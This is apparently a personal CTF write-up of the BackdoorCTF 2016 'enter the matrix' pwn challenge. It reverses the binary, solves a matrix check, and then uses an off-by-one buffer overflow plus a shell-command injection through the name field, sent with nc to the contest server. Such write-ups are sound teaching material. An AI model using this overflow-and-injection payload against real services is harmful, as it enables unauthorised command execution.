---
title: "BackdoorCTF 2016 - enter the matrix"
layout: post
date: 2016-06-07 14:21
tag:
- BackdoorCTF2016
- Pwning
- Backdoor
writeup: true
star: false
points: 350
category: Pwn
---

![Backdoor Logo](/assets/images/backdoorctf16/logo.png)

**BackdoorCTF is the annual flagship CTF competition conducted by SDSLabs and InfoSecIITR.**

#### Points: 350

#### Description:

>Can you reach Zion and find the flag? You can download a copy of the Matrix to play with [here](http://hack.bckdr.in/ENTER-THE-MATRIX/matrix), but the flag can only be found on Zion, through the real Matrix at
nc hack.bckdr.in 9004

## Write-up

**For this one I went a long way around to finally get the solution. Since this is my first writeup with pwning, I'll be writing about the whole journey around the binary so if you want to just quickly see the solution, [jump here](#the-actual-solution)**

So they gave a 32-bit ELF non-stripped executable. I opened it up in IDA and saw a function named `zion`. According to the description this is where we have to reach to get the flag. This function was making some `_system` call which is what I had to finally exploit. I decided to go into its details later and rather focus on reaching there first.

I run the binary normally `./matrix`. It gave me three options.

~~~
Welcome to the Matrix
---------------------

Please choose a pill:
1) Red pill
2) Blue pill
3) Exit

Choice:
~~~

Since there were just three options I decided to try them all.

`1. Red Pill` - It asked for a name. I filled some random string. The binary said it was expecting "Neo" and exited. Then I tried with the name "Neo". It said "See you on the other side, Neo... Knock knock." and exited. I wonder what other side it's talking about :P

`2. Blue Pill` - Learning from before I tried with the name "Neo". Ah so we got something here. Something related to Matrices as I wanted. I tried random matrix sizes and inputs and landed no-where. It just gave back `AxB` for the two matrices. Ofcourse that meant I need to look at the disassembly.

But first I decided to try the `Exit` option as well just to be sure. It had nothing worthwhile.

So now I looked at the disassembly.

![Function call](/assets/images/backdoorctf16/choice_call.png)

Here `ds:choice` is where our inital choice is stored which was `2`(Blue pill) in this case. So we see that it calls the function with function name at certain offsets to `ds:dispatcher`. I saw the data section to see what was being called for which choice.

![Dispatcher](/assets/images/backdoorctf16/dispatcher.png)

So following is the relation between choice and function call.

~~~
0 - zion()
1 - red_pill()
2 - blue_pill()
3 - exit_out()
~~~

On seeing this I though what if I just call zion by entering `choice` as `0`. But they had checks on the value of the choice(1-3).

So I proceeded to the disassembly of `blue_pill()`. It had lots and lots of assembly. But I decided to go through it to reach `zion`. I saw this line "So, you found the hidden multiplier. Good for you." and decided thats where I must reach. I went through a lot of assembly trying to understand the control flow. Finally I deciphered that a lot of assembly corresponded to loops for taking all the inputs terms for each Matrix and then multiplying them together.

![Check 7](/assets/images/backdoorctf16/check7.png)

The above shows the code where the matrix size is being compared to the number `7` and I also saw that this size was necessary to reach `zion`. I tried running the binary with size = 7 but nothing. I expected there to be some check on values entered in the two matrix or the terms of `AxB`. So what I was that they had a variable set to the value `49`. This value was decremented once in for each term of `AxB` if it matched a certain value stored in the data section. In the end if the value of this variable was `0`, it went into `zion`.

![Variable Set](/assets/images/backdoorctf16/var_set.png)
<figcaption class="caption">Variable set to 0x31 = 49</figcaption>
<br>

~~~python
mov     eax, expected_mult[eax*4] # Moved the value at a certian position in the array `expected_mult` to `eax`

cmp     ecx, eax # Compare it to `ecx` which was actually storing the multiplied value after all calculations

setz    al # Sets the `al` register to 1 if the zero register is set to zero i.e. if eax == ecx in prev. step

movzx   eax, al # Copy that to eax

sub     [ebp+var_12D8], eax # This is where 1 is being subtracted.

add     [ebp+var_12D0], 1 # This is just loop variable updation.
~~~

![Variable check](/assets/images/backdoorctf16/var_check.png)

So I checked all the required values from the data section; converted them to decimal; made it into one of the Matrices and kept the other as an Identity matrix. So I finally had the input file ready:

~~~
2
Neo
7
1 0 0 0 0 0 0
0 1 0 0 0 0 0
0 0 1 0 0 0 0
0 0 0 1 0 0 0
0 0 0 0 1 0 0
0 0 0 0 0 1 0
0 0 0 0 0 0 1

10521 43403 21171 23103 54799 23988 10671
57977 61619 7400 34766 62088 64441  59137
30588 11031 36049 8340 43958 50999 12801
24559 57246 18798 49058 35052 27517 47281
57718 20889 42562 16616 50837 39276 14191
6891 21083 13814 51375 30500 20360 61632
60643 4598 56582 23548 45837 35370 23163
~~~

I tried `cat input | ./matrix` and got

~~~
So, you found the hidden multiplier. Good for you.
I shall now prepare a spaceship to Zion, Neo
~~~

Woot! I was so happy at having completed this challenge. Now all the was left was send the same thing to the binary running on the server.

~~~bash
cat input | nc hack.bckdr.in 9004
~~~

I got back the same resonse as above but no flag. This was bad. After all this work! I remembered that I hadn't actually looked at what `zion()` was actually doing.

## The actual Solution

![zion](/assets/images/backdoorctf16/zion.png)
<figcaption class="caption">From zion()</figcaption>
<br>
So all `zion` was doing was to execute the following command `printf '[name]'`. The name in our case was 'Neo'. There is no chance we can get a flag with that. I tried different combinations like `Neo\0;cat flag` etc. I was expecting the string comparison to stop at `\0`. Nothing like that happened so I was unable to get into `zion` without keeping the name 'Neo'.

Probably this wasn't the right path afterall. I check at what all places `zion` function was being called. There was this other option which we had rejected earlier - setting the `choice` to `0`. There was a posibility that I maybe able to overwrite the `choice` while entering the `name`. I checked how they were being stored.

![name_choice](/assets/images/backdoorctf16/name_choice.png)

So the name could have 64 characters an just after that in the memory our choice was being stores.

So I tried to overwrite it:

~~~bash
python -c "print '2\n' + a'*64 + '\000'" | ./matrix
~~~

And voila! It did enter `zion`. So now I used the appropriate string so as to print the flag. This was a bit tricky. But this is what I finally used.

~~~bash
python -c "print '2\n'+'a'*9+'\';ls;cat \'flag_6fbb122c8e7f3408e4c783fbfe5052da\';'+'echo \''+'\000'" | nc hack.bckdr.in 9004
~~~

So the flag was in a file named `flag_6fbb122c8e7f3408e4c783fbfe5052da`. This I find out by sending an `ls` as you can see in the input; then modified the input to `cat` the correct file.

Finally got the flag!

![flag](/assets/images/backdoorctf16/matrix_flag.png)

The Vulnerability in this pwn challenge was `Off by One` error. This means that the program was reading 65 letters into the name rather than 64. We have all done this negligence:

Writing<br> `for(int i = 0; i <= 10; i++)`<br> rather than<br> `for(int i = 0; i < 10; i++)` ;) #nostalgia :P

Cheers who read through it all! I hope you learnt something from my mistakes. **Go through other [writeups](../../) for more such fun challenges.**
